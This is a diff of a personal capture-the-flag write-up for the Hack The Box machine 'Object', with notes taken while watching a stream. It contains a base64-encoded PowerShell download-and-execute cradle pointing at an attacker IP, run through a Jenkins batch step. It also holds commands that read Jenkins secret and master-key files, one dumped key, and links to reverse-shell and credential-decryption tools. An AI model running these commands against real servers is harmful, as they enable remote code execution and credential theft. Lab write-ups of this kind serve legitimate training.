@@ -1,4 +1,4 @@
-# Object Writeup
+# Object Helped-Through
 
 Name: Object
 Date:  12/2/2023
@@ -104,6 +104,7 @@ Encode
 iconv -f ASCII -t UTF-16LE psFileInfilAndExec.txt | tr -d "\n" | base64 -w0
 SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAzADkALwBJAFAAVAAuAHAAcwAxACcAKQAA
 ```
+
 Jenkin Windows Batch script execution
 ```powershell
 cmd /c powershell -nop -exec bypass -w hidden -e SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAzADkALwBJAFAAVAAuAHAAcwAxACcAKQAA
@@ -115,7 +116,165 @@ I tried one argument and it complaint, tried two it complained again, went back
 Then I could not find my http server, which is really weird considering that we have PoC from the ping. I tried wget, not on the box, and curl is disabled
 ![](disabledinlibcurl.png)
 
-1:35
+From 1:35 to : is an awesome monolog about Stuxnet, Flame, Eternal Blue, 0days, APTs and Hacking the Planet. Al seems to be malding hard at the powershell.
+
+Deskop App Web Viewer is allowed. The `(65536)` is the Ports that it has successful probed.
+```powershell
+Name                  : {EF6E166B-E36D-4D2B-8E04-FBFD6960428F}
+DisplayName           : Desktop App Web Viewer
+Description           : Desktop App Web Viewer
+DisplayGroup          : Desktop App Web Viewer
+Group                 : @{Microsoft.Win32WebViewHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy?ms-resource://Windows.W
+                        in32WebViewHost/resources/DisplayName}
+Enabled               : True
+Profile               : Domain, Private, Public
+Platform              : {6.2+}
+Direction             : Inbound
+Action                : Allow
+EdgeTraversalPolicy   : Allow
+LooseSourceMapping    : False
+LocalOnlyMapping      : False
+Owner                 : S-1-5-21-4088429403-1159899800-2753317549-500
+PrimaryStatus         : OK
+Status                : The rule was parsed successfully from the store. (65536)
+EnforcementStatus     : NotApplicable
+PolicyStoreSource     : PersistentStore
+PolicyStoreSourceType : Local
+
+
+Name                  : {C5A26574-EBAB-4E3C-ABE0-05A1B8F65E0C}
+DisplayName           : Desktop App Web Viewer
+Description           : Desktop App Web Viewer
+DisplayGroup          : Desktop App Web Viewer
+Group                 : @{Microsoft.Win32WebViewHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy?ms-resource://Windows.W
+                        in32WebViewHost/resources/DisplayName}
+Enabled               : True
+Profile               : Domain, Private, Public
+Platform              : {6.2+}
+Direction             : Inbound
+Action                : Allow
+EdgeTraversalPolicy   : Allow
+LooseSourceMapping    : False
+LocalOnlyMapping      : False
+Owner                 : S-1-5-21-4088429403-1159899800-2753317549-1106
+PrimaryStatus         : OK
+Status                : The rule was parsed successfully from the store. (65536)
+EnforcementStatus     : NotApplicable
+PolicyStoreSource     : PersistentStore
+PolicyStoreSourceType : Local
+```
+
+
+
+Advanced Persistent Tears as `certutil` does not connect for the first time in as many boxes as I have done by now. Al is malding hard still.
+![](AdvancedPersistentTears.png) 
+
+`ls` thinking about the file system WebView is cameras
+![](filesystem.png)
+
+Nishang has a version [ICMP reverse shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1), but requires a python2 tool. Al is still malding from chat. [icmpdoor](https://github.com/krabelize/icmpdoor) loks cool though. Al is full mald by 2:16...then someone in the chat says he is not putting in the effort.  While Al vents I looked up 0xdf 
+
+```powershell
+powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block 
+```
+
+```powershell
+powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block |
+Format-Table -Property 
+DisplayName, 
+@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},
+@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},
+@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},
+Enabled,
+Profile,
+Direction,
+Action"
+```
+
+```powershell
+powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action"
+
+```
+
+```powershell
+powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
+```
+I will screenshot each level and be methodically while remember how emotions and tireness kill hacking.
+![](firstlsup.png)
+
+```powershell
+type ../secret.key
+type ../config.xml
+type ../identity.key.enc
+type ../jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml
+ls ../secrets
+ls ../users
+```
+
+
+The reason I think this is kicker is that initial thought is reverse shell, upload, check connections
+![](secondlsup.png)
+
+Also I appreciate Al suffering and the powering through
+![](thirdlsup.png)
+
+Al powered through this machine like absolute hero deomnstrating awesome determination, excellent insights into real world goings on beyond scope of CTFs. 
+![](forthlsup.png)
+
+I am very glad he keeps streaming and very grateful.
+![](groovybaby.png)
+
+I know could have just targeted each directory by name, but for pure data handling
+![](users.png)
+
+The C:\\ 
+![1080](cdrive.png)
+
+Think Smart not Hard 
+1. Check connection - ping , firewall rules
+2. **Incrementally** read file system 
+	1. Credentials
+	2. File and Directory Permissions
+
+```powershell
+cmd /c powershell -c Get-Content -Path '../../secret.key'
+cmd /c powershell -c Get-Content -Path '../../config.xml'
+cmd /c powershell -c Get-Content -Path '../../identity.key.enc'
+cmd /c powershell -c Get-Content -Path '../../jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml'
+cmd /c powershell -c ls '../../secrets'
+cmd /c powershell -c ls '../../users'
+```
+
+Apperently someone modified the firewall rules which sound ultra beyond root material. Regardless
+```
+ac5757641b505503f44d2752ffa01e621bf5b935763ebc8adaa2e90cf85b13ac
+```
+
+We have a key, but no password in the config
+![1080](seefsreadinglog.png)
+
+But each user has a directory `admin_17207690984073220035` and there is a `master.key` amongst other data
+```powershell
+cmd /c powershell -c Get-Content -Path  ../../secrets/hudson.model.Job.serverCookie                                       
+cmd /c powershell -c Get-Content -Path  ../../secrets/hudson.util.Secret                                                  
+cmd /c powershell -c Get-Content -Path  ../../secrets/jenkins.model.Jenkins.crumbSalt                                     
+cmd /c powershell -c Get-Content -Path  ../../secrets/master.key
+cmd /c powershell -c ls  ../../users/admin_17207690984073220035
+```
+
+Results in a another config and more
+![1080](otherconfigandmore.png)
+
+Al goes quiet till but forwards the way with [hoto's jenkins decryptor](https://github.com/hoto/jenkins-credentials-decryptor)
+
+Notes
+
+https://github.com/gquere/pwn_jenkins
+https://itluke.online/2018/11/27/how-to-display-firewall-rule-ports-with-powershell/
+https://0xdf.gitlab.io/2022/02/28/htb-object.html#shell-as-oliver
+https://github.com/theGuildHall/pwnbox - 
+
+
 
 ## Exploit
 
@@ -125,6 +284,14 @@ Then I could not find my http server, which is really weird considering that we 
 
 ## Beyond Root
 
+####  KOTH/BGs, Meta
+
 I think the ultimate meta would be to KOTH logging and exfiltrating the logs monitoring the other attackers and defender action for the TTPs.
 
-Cheking out I-Am-Jackoby - https://github.com/I-Am-Jakoby/PowerShell-for-Hackers mentioned during the stream.
+#### Powershell-For-Hackers
+
+Checking out I-Am-Jackoby - https://github.com/I-Am-Jakoby/PowerShell-for-Hackers mentioned during the stream.
+
+#### Modify a Firewall Rule
+
+#### Ping Shell
